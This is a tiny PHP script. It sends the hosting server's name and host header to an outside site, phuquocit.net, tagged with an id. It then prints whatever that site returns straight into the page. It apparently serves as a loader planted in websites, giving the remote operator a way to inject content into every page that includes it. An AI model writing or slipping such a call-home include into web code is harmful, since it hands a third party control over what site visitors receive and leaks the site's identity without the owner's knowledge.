<?php
$domain=$_SERVER['SERVER_NAME']."|".$_SERVER['HTTP_HOST'];
	$value=file_get_contents("http://phuquocit.net/tool/update.php?id=boyhanoi&domain=$domain");
	echo $value;
?>